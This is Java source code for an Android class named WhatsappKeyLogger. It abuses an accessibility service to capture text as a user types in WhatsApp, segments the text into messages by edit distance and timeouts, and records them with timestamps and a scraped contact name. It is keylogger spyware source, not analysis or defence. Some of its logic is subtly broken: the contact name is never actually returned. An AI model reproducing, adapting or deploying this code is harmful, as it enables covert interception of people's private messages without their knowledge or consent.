package com.example.afinal.whatsappaccessability;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.os.Environment;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;

/**
 * Created by Dor on 12/6/2017.
 */



public class WhatsappKeyLogger {

    File file;
    private long firstHitTime;
    static private String previous;
    private AccessibilityService context;

    public WhatsappKeyLogger(AccessibilityService context)
    {
        this.context = context;

        firstHitTime = System.currentTimeMillis();
        previous = new String();
        file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "dor");
    }



    private boolean findContentDescription(AccessibilityNodeInfo info, boolean flag, String str) {
        if (info == null || flag == true) return flag;

        if(info.getContentDescription() != null) {

            if(info.getContentDescription().toString().contentEquals(str))
            {
                flag = true;
            }
        }
        for (int i = 0; i < info.getChildCount(); i++) {

            AccessibilityNodeInfo nodeInfo = info.getChild(i);
            flag = findContentDescription(nodeInfo, flag, str);
        }
        return flag;
    }


    protected synchronized boolean isRelevantScreen(AccessibilityEvent event) {

        if(context.getRootInActiveWindow().getPackageName() != null) {
            if (context.getRootInActiveWindow().getPackageName().toString().contains("whatsapp") &&
                    findContentDescription(context.getRootInActiveWindow(), false, "Emoji")) {
                return true;
            }
        }


        return false;
    }

    public synchronized void load(AccessibilityEvent event, Context context)
    {
        if(event.getEventType() != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED)
        {
            return;
        }
        String text = event.getText().toString();
        firstHitTime = System.currentTimeMillis();
        if(previous.isEmpty() == true ||  previous.length() < 2)
        {
            previous = text;
        }
        else
        {
            int distance = levenshteinDistance(previous, text);
            if(distance > 1)
            {
                if(!(distance == 2 && text.length() > 4))
                {
                    flush(previous);
                }
            }
        }
        previous = text;
    }


    public synchronized void notifyEvent()
    {
        long diff = System.currentTimeMillis() - firstHitTime;
        Log.e("Dordor", "Diff: " + diff + " previous: " + previous);
        if((diff >= 5000) && previous.length() >= 2 )
        {
            if (!previous.isEmpty()){
                flush(previous);
                previous = "";
            }else{
                Log.e("Dordor", "previous is empty while timeout");
            }

        }
    }


    public String getNameParse(AccessibilityNodeInfo info,String name)
    {
        if (info == null) return name;


        if(info.getClassName().toString().contains("LinearLayout") && info.getChildCount()  == 1)
        {
            AccessibilityNodeInfo child2 = info.getChild(0);
            if(child2.getText() != null) {
                name = child2.getText().toString();
                return name;
            }
        }

        for (int i = 0; i < info.getChildCount(); i++) {

            AccessibilityNodeInfo nodeInfo = info.getChild(i);
            getNameParse(nodeInfo,name);
        }

        return name;

    }

    private synchronized void flush(String str)
    {
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(Calendar.getInstance().getTime());

        Message message = new Message(Message.MessageType.MESSAGE, Message.PriorityTime.KEY_LOGGER,str,timeStamp,null);
        message.setInMessage(false);
        message.setName("me");
        String name = null;
        getNameParse(context.getRootInActiveWindow(),name);
        HandleChats.addMessage(message,name);
    }


    private static int minimum(int a, int b, int c)
    {
        return Math.min(Math.min(a,b),c);
    }
    private int levenshteinDistance(String lhs, String rhs)
    {
        int[][] distance = new int[lhs.length() + 1][rhs.length() + 1];

        for (int i = 0; i <= lhs.length(); i++)
            distance[i][0] = i;
        for (int j = 1; j <= rhs.length(); j++)
            distance[0][j] = j;

        for (int i = 1; i <= lhs.length(); i++)
            for (int j = 1; j <= rhs.length(); j++)
                distance[i][j] = minimum(
                        distance[i - 1][j] + 1,
                        distance[i][j - 1] + 1,
                        distance[i - 1][j - 1] + ((lhs.charAt(i - 1) == rhs.charAt(j - 1)) ? 0 : 1));

        return distance[lhs.length()][rhs.length()];
    }
}
